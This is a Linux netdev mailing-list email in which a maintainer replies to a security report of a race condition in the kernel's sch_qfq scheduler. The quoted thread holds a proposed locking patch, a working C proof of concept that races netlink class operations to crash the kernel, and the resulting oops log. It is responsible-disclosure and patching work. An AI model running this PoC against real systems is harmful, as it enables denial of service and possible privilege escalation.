Return-Path: <netdev+bounces-202393-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
	by mail.lfdr.de (Postfix) with ESMTPS id 7EE4BAEDB3C
	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 13:36:44 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 1C9183A40A2
	for <lists+netdev@lfdr.de>; Mon, 30 Jun 2025 11:36:18 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id C292E25DCF2;
	Mon, 30 Jun 2025 11:36:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="RKug/YmV"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CCBF323D287
	for <netdev@vger.kernel.org>; Mon, 30 Jun 2025 11:36:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1751283399; cv=none; b=aHx04dVjLa6m+RhFOT7JTjJSMcQgBnHAO0TEcCil901JOB4GcaUWJMFr6iT9lyosr6RHntS7fTlALCC4cHLZ5jY8n+6H4RVDciavS/EQVYwtJ6k70KG2jWIUWdQuIVjE2JlgYW9jwz1Hryw7iorIKgWupLptMtiPss2dK2+UGGI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1751283399; c=relaxed/simple;
	bh=TlWbz/Xv1LfW4ATl9oI6aRo18nuqsW8japyQGP0NZhg=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=H4cNc9wSKlQChEwCDgRKfjSSoxCDeIdkAYFQTrGsr0KSqQ+gWqvVddgfTK+SYUQGquNVwak8k5QOjvE5q8hK4ti1YUs9F6FxHqV0EzOX9aGurf7Bv8rCAyRsIm9py5Hc8cyXq91Tnr2Ia+dqnHMcxallnAzkiWjvPATZuOvjk1o=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=RKug/YmV; arc=none smtp.client-ip=209.85.210.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-747fba9f962so3987599b3a.0
        for <netdev@vger.kernel.org>; Mon, 30 Jun 2025 04:36:37 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1751283397; x=1751888197; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=UGR4tgF+WZbJ0/gPKq0QFkiVZOL/L5i22m6w3MiAbhM=;
        b=RKug/YmV0Qc9A0LxthjvbcAdXzd4MFex3brhhDuheSc6Mv9QMTaQToLjMMvPTAUPrH
         Vq2309EyHbWqHQgR9+KDvJqcO7SXEedDBcpxLydM2MuXR8q2Onh4c1jiufaAjc6fhAU1
         tCpYsW3svp6mf43DpW1qV+At57bxgVjROmVPBQiNr7UG0vePhL4bK9bBE6v8G2ANmNWp
         annBrl/BoiiajJwvS427TkeUD5foJ4K5Va/1DZQZ4YB3h/c5UmALsQ50TxPPhLgsOoQP
         rcRHJmwN5cL+TSfJY3m5TlCiYjbBrQq/w0QEmrDm026ECM+MgpHXv6jWI3OyvcCKRzV1
         Vf0A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1751283397; x=1751888197;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=UGR4tgF+WZbJ0/gPKq0QFkiVZOL/L5i22m6w3MiAbhM=;
        b=b3A3XkNqB1bzm9nY5cCHXfsLmYAeOYdnAqv7o7rUhwhYk7N6d40utmZJB07N4pGSxR
         9x6gpnC4tjmOyJgbyAz796Tq5ea+TOFlL2BeNX/Zf33huXygBEEYF3IqbePnBflzpbyb
         +QyMuQG8rTxi68F6zTUWW0sbKhxLV2D1xdfRA8T4C2Y5/6WYFcRNFksGuFvyEinrbHtm
         Ji7S3EOjjR3SNldE3ah8XWVab6NnuT9C898XgPWc+Tj6S/177ZlaC7T/LT15LKnD9C+/
         MxI1haVuIQrHIu8hs7kwEkXOg+b03qihvNzP+RWjvmffjRIJRZ1gjd2qgLDo5UVhg9PE
         5n2A==
X-Forwarded-Encrypted: i=1; AJvYcCWE+c5x9oTafhTN3/Ds02p89/xRYf2ge1m2P46Q70KNHwsZeYZWLRD7gf+38dTQm3+pMnq9New=@vger.kernel.org
X-Gm-Message-State: AOJu0YwUwsrwvdX9Hzn63SLst0H2TrF16ZkIhhkExKkMb0TFV9BGmFxI
	L4LmRMpLyg8VwGjNjtv4E1oL1OQ3SYA+3YPEz6Sp7O+bbLLT9vXk2Y2+NN3rEv8/23tDaDBK9vM
	80jtWLPRa36gMWuBzsbabTyA7QaA2fv/9Vhi5AUgT
X-Gm-Gg: ASbGncv+DTNOK5TvFhhoRtB6+Accs5NfTvZDhw10cMmVWaD/sZLkq6fqB6MKc2dUbIR
	kAOnBlTFh7cNanqybKhOf8UfmVMsgva6OYUg68otGl+e02ZNBkyHHPkiayGtsMQoR6q0bKkpZSz
	VLCdoC4sJgeY1n0tAOQMht3m11EhlXGSnjGwAM28JeWQ==
X-Google-Smtp-Source: AGHT+IFtANPGU6vKx9QjF5izygfbFrVRYChqJf54LwtW77QdALsylIuQl/wITE3zacTnWL4tJs5lwECP4sqWCUWSk9k=
X-Received: by 2002:a05:6a00:10d5:b0:746:25d1:b712 with SMTP id
 d2e1a72fcca58-74af7ace890mr16994843b3a.7.1751283396905; Mon, 30 Jun 2025
 04:36:36 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <CAPpSM+SKOj9U8g_QsGp8M45dtEwvX4B_xdd7C0mP9pYu1b4mzA@mail.gmail.com>
 <CAM0EoMn+UiSmpH=iBeevpUN5N8TW+2GSEmyk6vA2MWOKgsRjBA@mail.gmail.com> <aGIAbGB1VAX-M8LQ@xps>
In-Reply-To: <aGIAbGB1VAX-M8LQ@xps>
From: Jamal Hadi Salim <jhs@mojatatu.com>
Date: Mon, 30 Jun 2025 07:36:24 -0400
X-Gm-Features: Ac12FXy1N5WK6re36QhGONkc6X5xWcfPvJ6_qZiYfseUbgehJbKLMyqSLjvGf7I
Message-ID: <CAM0EoMnBoCpc7hnK_tghXNMWy+r7nKPGSsKrJiHoQo=G8F6k=A@mail.gmail.com>
Subject: Re: sch_qfq: race conditon on qfq_aggregate (net/sched/sch_qfq.c)
To: Xiang Mei <xmei5@asu.edu>
Cc: security@kernel.org, 
	Linux Kernel Network Developers <netdev@vger.kernel.org>, Cong Wang <xiyou.wangcong@gmail.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Sun, Jun 29, 2025 at 11:11=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> On Sun, Jun 29, 2025 at 10:28:12AM -0400, Jamal Hadi Salim wrote:
> > On Sun, Jun 29, 2025 at 3:13=E2=80=AFAM Xiang Mei <xmei5@asu.edu> wrote=
:
> > >
> > > Linux Kernel Security Team,
> > >
> > > We are writing to bring to your attention a race condition vulnerabil=
ity in net/sched/sch_qfq.c.
> > >
> > > In function qfq_delete_class, the line `qfq_destroy_class(sch, cl);` =
is outside the protection of ` sch_tree_lock`, so any operation on agg coul=
d lead to a race condition vulnerability. For example, we can get a UAF by =
racing it with qfq_change_agg in qfq_enqueue.
> > >
> > > We verified it on v6.6.94 and exploited it in kernelCTF cos-109-17800=
.519.32.
> > > A temporal fix could be
> > > ```c
> > > @@ -558,10 +562,9 @@ static int qfq_delete_class(struct Qdisc *sch, u=
nsigned long arg,
> > >
> > >  qdisc_purge_queue(cl->qdisc);
> > >  qdisc_class_hash_remove(&q->clhash, &cl->common);
> > > -
> > > +        qfq_destroy_class(sch, cl);
> > >  sch_tree_unlock(sch);
> > >
> > > -       qfq_destroy_class(sch, cl);
> > >  return 0;
> > >  }
> > > ```
> > >
> > > But this only avoids the exploitation. There are other places to expl=
oit the vulnerability with a General Protection (usually null-deref). We fo=
und two places that can crash the kernel:
> > >
> > > 1. When modifying an existing class in  qfq_change_class, the reads o=
f cl->agg->weight or cl->agg->lmax could lead to GPs.
> > > 2. Reads of agg content in qfq_dump_class could lead to GPs.
> > >
> > > These reads of the agg structure may require `RCU` or `lock` to prote=
ct.
> > >
> > > Looking forward to hearing from you and discussing the patching.
> > >
> >
> >
> > Please partake in the discussion to fix this, your other issue and
> > others on the netdev list, start with this thread:
> > https://lore.kernel.org/netdev/aF847kk6H+kr5kIV@pop-os.localdomain/
>
> Thanks so much for your time and the helpful information.
>
> Here is a potential patch to this vulnerability:
>
> sch_lock was used to protect the read/write options of aggs. The
> lock may influence the performance of the scheduler, and RCU could also
> be a patch option.
>


I did test your earlier repro and could not create the issue. I dont
have time right now, but are you sure this new repro can create the
issue?

cheers,
jamal

> ```
> From e64c4f5d662dc3f3c5dedf4b755a151d826d7f70 Mon Sep 17 00:00:00 2001
> From: n132 <xmei5@asu.edu>
> Date: Sun, 29 Jun 2025 16:26:43 -0700
> Subject: [PATCH] net/sched: sch_qfq: Fix qfq_aggregate race condition
>
> Apply sch_lock when reading or modifying agg data to prevent race conditi=
ons between class options and enqueue.
> ---
>  net/sched/sch_qfq.c | 30 +++++++++++++++++++++---------
>  1 file changed, 21 insertions(+), 9 deletions(-)
>
> diff --git a/net/sched/sch_qfq.c b/net/sched/sch_qfq.c
> index bf1282cb22eb..dc77ffc01bb3 100644
> --- a/net/sched/sch_qfq.c
> +++ b/net/sched/sch_qfq.c
> @@ -412,7 +412,7 @@ static int qfq_change_class(struct Qdisc *sch, u32 cl=
assid, u32 parentid,
>         bool existing =3D false;
>         struct nlattr *tb[TCA_QFQ_MAX + 1];
>         struct qfq_aggregate *new_agg =3D NULL;
> -       u32 weight, lmax, inv_w;
> +       u32 weight, lmax, inv_w, old_weight, old_lmax;
>         int err;
>         int delta_w;
>
> @@ -443,12 +443,16 @@ static int qfq_change_class(struct Qdisc *sch, u32 =
classid, u32 parentid,
>         inv_w =3D ONE_FP / weight;
>         weight =3D ONE_FP / inv_w;
>
> -       if (cl !=3D NULL &&
> -          lmax =3D=3D cl->agg->lmax &&
> -          weight =3D=3D cl->agg->class_weight)
> -               return 0; /* nothing to change */
> +       if(cl !=3D NULL){
> +               sch_tree_lock(sch);
> +               old_weight =3D cl->agg->class_weight;
> +               old_lmax   =3D cl->agg->lmax;
> +               sch_tree_unlock(sch);
> +               if (lmax =3D=3D old_lmax && weight =3D=3D old_weight)
> +                       return 0; /* nothing to change */
> +       }
>
> -       delta_w =3D weight - (cl ? cl->agg->class_weight : 0);
> +       delta_w =3D weight - (cl ? old_weight : 0);
>
>         if (q->wsum + delta_w > QFQ_MAX_WSUM) {
>                 NL_SET_ERR_MSG_FMT_MOD(extack,
> @@ -555,10 +559,10 @@ static int qfq_delete_class(struct Qdisc *sch, unsi=
gned long arg,
>
>         qdisc_purge_queue(cl->qdisc);
>         qdisc_class_hash_remove(&q->clhash, &cl->common);
> +       qfq_destroy_class(sch, cl);
>
>         sch_tree_unlock(sch);
>
> -       qfq_destroy_class(sch, cl);
>         return 0;
>  }
>
> @@ -625,6 +629,8 @@ static int qfq_dump_class(struct Qdisc *sch, unsigned=
 long arg,
>  {
>         struct qfq_class *cl =3D (struct qfq_class *)arg;
>         struct nlattr *nest;
> +       u32 class_weight;
> +       u32 lmax;
>
>         tcm->tcm_parent =3D TC_H_ROOT;
>         tcm->tcm_handle =3D cl->common.classid;
> @@ -633,8 +639,12 @@ static int qfq_dump_class(struct Qdisc *sch, unsigne=
d long arg,
>         nest =3D nla_nest_start_noflag(skb, TCA_OPTIONS);
>         if (nest =3D=3D NULL)
>                 goto nla_put_failure;
> -       if (nla_put_u32(skb, TCA_QFQ_WEIGHT, cl->agg->class_weight) ||
> -          nla_put_u32(skb, TCA_QFQ_LMAX, cl->agg->lmax))
> +       sch_tree_lock(sch);
> +       class_weight =3D cl->agg->class_weight;
> +       lmax         =3D cl->agg->lmax;
> +       sch_tree_unlock(sch);
> +       if (nla_put_u32(skb, TCA_QFQ_WEIGHT, class_weight) ||
> +          nla_put_u32(skb, TCA_QFQ_LMAX, lmax))
>                 goto nla_put_failure;
>         return nla_nest_end(skb, nest);
>
> @@ -651,8 +661,10 @@ static int qfq_dump_class_stats(struct Qdisc *sch, u=
nsigned long arg,
>
>         memset(&xstats, 0, sizeof(xstats));
>
> +       sch_tree_lock(sch);
>         xstats.weight =3D cl->agg->class_weight;
>         xstats.lmax =3D cl->agg->lmax;
> +       sch_tree_unlock(sch);
>
>         if (gnet_stats_copy_basic(d, NULL, &cl->bstats, true) < 0 ||
>            gnet_stats_copy_rate_est(d, &cl->rate_est) < 0 ||
> --
> 2.43.0
> ```
>
> Here is the PoC triggering the race condition for your reference:
>
> ```c
> #include <stdio.h>
> #include <sys/socket.h>
> #include <linux/rtnetlink.h>
> #include <linux/pkt_sched.h>
> #include <linux/if_arp.h>
> struct tf_msg {
>     struct nlmsghdr nlh;
>     struct tcmsg tcm;
> #define TC_DATA_LEN 0x200
>     char attrbuf[TC_DATA_LEN];
> };
> struct if_msg {
>     struct nlmsghdr nlh;
>     struct ifinfomsg ifi;
> };
> typedef unsigned int u32;
> int nl, inet_sock_fd;
> char *  msgQdiscCreate;
> char *  tclass_0x20001_create;
> char *  tclass_0x20002_create;
> char *  tclass_0x20001_reset;
>
> unsigned short add_rtattr (unsigned long rta_addr, unsigned short type, u=
nsigned short len, char *data) {
>     struct rtattr *rta =3D (struct rtattr *)rta_addr;
>     rta->rta_type =3D type;
>     rta->rta_len =3D RTA_LENGTH(len);
>     memcpy(RTA_DATA(rta), data, len);
>     return rta->rta_len;
> }
> int initNL(){
>     struct if_msg if_up_msg =3D {
>         {
>             .nlmsg_len =3D 32,
>             .nlmsg_type =3D RTM_NEWLINK,
>             .nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK,
>         },
>         {
>             .ifi_family =3D AF_UNSPEC,
>             .ifi_type =3D ARPHRD_NETROM,
>             .ifi_index =3D 1,
>             .ifi_flags =3D IFF_UP,
>             .ifi_change =3D 1,
>         },
>     };
>     int nl_sock_fd =3D socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
>     if_up_msg.ifi.ifi_index =3D if_nametoindex("lo");
>     NLMsgSend(nl_sock_fd, (struct tf_msg *)(&if_up_msg));
>     return nl_sock_fd;
> }
> void NLMsgSend (int sock, struct tf_msg *m) {
>     struct {
>         struct nlmsghdr nh;
>         struct nlmsgerr ne;
>     } ack;
>     write(sock, m, m->nlh.nlmsg_len);
>     read(sock , &ack, sizeof(ack));
> }
> /* Prepared Values*/
> void init_loopbacksend (u32 prio) {
>     struct sockaddr iaddr =3D { AF_INET };
>     inet_sock_fd =3D socket(PF_INET, SOCK_DGRAM, 0);
>     int res =3D setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &prio, =
sizeof(prio));
>     connect(inet_sock_fd, &iaddr, sizeof(iaddr));
> }
>
> /* Trafic control for netlink */
> void init_tf_msg (struct tf_msg *m) {
>     m->nlh.nlmsg_len    =3D NLMSG_LENGTH(sizeof(m->tcm));
>     m->nlh.nlmsg_type   =3D 0;    // Default Value
>     m->nlh.nlmsg_flags  =3D NLM_F_REQUEST | NLM_F_ACK;
>     m->nlh.nlmsg_seq    =3D 0;    // Default Value
>     m->nlh.nlmsg_pid    =3D 0;    // Default Value
>
>     // tcmsg
>     m->tcm.tcm_family   =3D PF_UNSPEC;
>     m->tcm.tcm_ifindex  =3D if_nametoindex("lo");
>     m->tcm.tcm_handle   =3D 0;    // Default Value
>     m->tcm.tcm_parent   =3D -1;   // Default Value for no parent
>     m->tcm.tcm_info     =3D 0;    // Default Value
> }
>
> struct tf_msg * classGet(u32 classid){
>     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
>     init_tf_msg(m);
>     m->nlh.nlmsg_type        =3D RTM_GETTCLASS;
>     m->tcm.tcm_handle        =3D classid;
>     return m;
> }
> struct tf_msg * qfqQdiscAdd(u32 handle, u32 parent) {
>     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
>     init_tf_msg(m);
>     m->nlh.nlmsg_type    =3D RTM_NEWQDISC;
>     m->nlh.nlmsg_flags   |=3D NLM_F_CREATE;
>     m->tcm.tcm_handle    =3D handle;
>     m->tcm.tcm_parent    =3D parent;
>     m->nlh.nlmsg_len     +=3D NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_AL=
IGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
>     return m;
> }
> struct tf_msg * qfqClassAdd(int type, u32 classid,u32 val){
>     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
>     init_tf_msg(m);
>     m->nlh.nlmsg_type       =3D RTM_NEWTCLASS;
>     m->tcm.tcm_parent       =3D 0;
>     m->tcm.tcm_handle       =3D classid;
>     m->nlh.nlmsg_flags      |=3D NLM_F_CREATE;
>     m->nlh.nlmsg_len        +=3D NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG=
_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
>
>     struct rtattr *opts     =3D (struct rtattr *)((size_t)m + NLMSG_ALIGN=
(m->nlh.nlmsg_len));
>     opts->rta_type          =3D TCA_OPTIONS;
>     opts->rta_len           =3D RTA_LENGTH(0);
>
>     if(type =3D=3D TCA_QFQ_LMAX)
>         opts->rta_len +=3D RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_=
len, TCA_QFQ_LMAX, sizeof(val), (char *)&val));
>     else if(type =3D=3D TCA_QFQ_WEIGHT)
>         opts->rta_len +=3D RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_=
len, TCA_QFQ_WEIGHT, sizeof(val), (char *)&val));
>     m->nlh.nlmsg_len +=3D NLMSG_ALIGN(opts->rta_len);
>     return m;
> }
> void initContext(){
>     msgQdiscCreate =3D        qfqQdiscAdd(0x20000,-1);
>     tclass_0x20001_reset  =3D tclass_0x20001_create =3D qfqClassAdd(TCA_Q=
FQ_LMAX,0x20001,0x200);
>     tclass_0x20002_create =3D qfqClassAdd(TCA_QFQ_LMAX,0x20002,0x400);
> }
> int main(){
>     initContext();
>     nl =3D initNL();
>     NLMsgSend(nl,msgQdiscCreate);
>     NLMsgSend(nl,tclass_0x20001_create);
>     NLMsgSend(nl,tclass_0x20002_create);
>     init_loopbacksend(0x20001);
>     if(fork()){
>         while(1){
>             write(inet_sock_fd, "", 0x400-42); // upgrade
>             NLMsgSend(nl,tclass_0x20001_reset);
>         }
>     }else{
>         char * pay =3D classGet(0x20001);
>         while(1)
>             NLMsgSend(nl,pay);
>     }
> }
>
> /*
> [    1.078863] BUG: kernel NULL pointer dereference, address: 00000000000=
00028
> [    1.079284] #PF: supervisor read access in kernel mode
> [    1.079580] #PF: error_code(0x0000) - not-present page
> [    1.079882] PGD 101e10067 P4D 101e10067 PUD 101e11067 PMD 0
> [    1.080211] Oops: 0000 [#1] PREEMPT SMP NOPTI
> [    1.080466] CPU: 1 PID: 117 Comm: exploit Not tainted 6.6.94 #1
> [    1.080873] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996),=
 BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [    1.081426] RIP: 0010:qfq_dump_class+0x7f/0x120
> [    1.081700] Code: 2b 95 ff 85 c0 0f 88 a3 00 00 00 4d 85 e4 0f 84 9a 0=
0 00 00 48 8b 45 68 48 8d 4c 24 04 ba 04 00 00 00 48 89 df be 01 00 00 00 <=
8b> 40 28 89 44 24 04 e8 c5 2b 95 ff 85 c0 75 5b 48 8b 45 68 48 8d
> [    1.082747] RSP: 0018:ffffc900004975b0 EFLAGS: 00010282
> [    1.083050] RAX: 0000000000000000 RBX: ffff8881013e7100 RCX: ffffc9000=
04975b4
> [    1.083447] RDX: 0000000000000004 RSI: 0000000000000001 RDI: ffff88810=
13e7100
> [    1.083846] RBP: ffff888100b90380 R08: 0000000000000014 R09: ffff88810=
177e030
> [    1.084238] R10: 00000000000381a0 R11: ffff888101fd8000 R12: ffff88810=
177e02c
> [    1.084645] R13: ffff88810177e000 R14: ffffffff82d662a0 R15: ffff88810=
1fd8000
> [    1.085072] FS:  00000000198fe3c0(0000) GS:ffff88811c500000(0000) knlG=
S:0000000000000000
> [    1.085557] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [    1.085888] CR2: 0000000000000028 CR3: 000000010168e000 CR4: 000000000=
0750ee0
> [    1.086329] PKRU: 55555554
> [    1.086491] Call Trace:
> [    1.086645]  <TASK>
> [    1.086777]  tc_fill_tclass+0x145/0x240
> [    1.087008]  tclass_notify.constprop.0+0x6a/0xd0
> [    1.087275]  tc_ctl_tclass+0x3bc/0x5a0
> [    1.087496]  rtnetlink_rcv_msg+0x14e/0x3d0
> [    1.087734]  ? kmem_cache_alloc_node+0x4b/0x520
> [    1.088011]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
> [    1.088281]  netlink_rcv_skb+0x57/0x100
> [    1.088506]  netlink_unicast+0x247/0x390
> [    1.088733]  netlink_sendmsg+0x250/0x4d0
> [    1.088964]  sock_write_iter+0x199/0x1a0
> [    1.089192]  vfs_write+0x393/0x440
> [    1.089396]  ksys_write+0xb7/0xf0
> [    1.089591]  do_syscall_64+0x5e/0x90
> [    1.089801]  ? do_syscall_64+0x6a/0x90
> [    1.090022]  ? netlink_rcv_skb+0x84/0x100
> [    1.090254]  ? kmem_cache_free+0x1e/0x360
> [    1.090484]  ? kmem_cache_free+0x1e/0x360
> [    1.090713]  ? netlink_unicast+0x252/0x390
> [    1.090953]  ? netlink_sendmsg+0x25d/0x4d0
> [    1.091189]  ? sock_write_iter+0x199/0x1a0
> [    1.091425]  ? vfs_write+0x393/0x440
> [    1.091633]  ? exit_to_user_mode_prepare+0x1a/0x150
> [    1.091915]  ? syscall_exit_to_user_mode+0x27/0x40
> [    1.092190]  ? do_syscall_64+0x6a/0x90
> [    1.092407]  ? exit_to_user_mode_prepare+0x1a/0x150
> [    1.092686]  ? syscall_exit_to_user_mode+0x27/0x40
> [    1.092962]  ? do_syscall_64+0x6a/0x90
> [    1.093180]  ? do_syscall_64+0x6a/0x90
> [    1.093397]  ? clear_bhb_loop+0x60/0xb0
> [    1.093620]  ? clear_bhb_loop+0x60/0xb0
> [    1.093842]  ? clear_bhb_loop+0x60/0xb0
> [    1.094066]  ? clear_bhb_loop+0x60/0xb0
> [    1.094287]  ? clear_bhb_loop+0x60/0xb0
> [    1.094508]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
> */
> ```
>
> >
> > cheers,
> > jamal
> >
> >
> > > Thanks,
> > > Xiang Mei

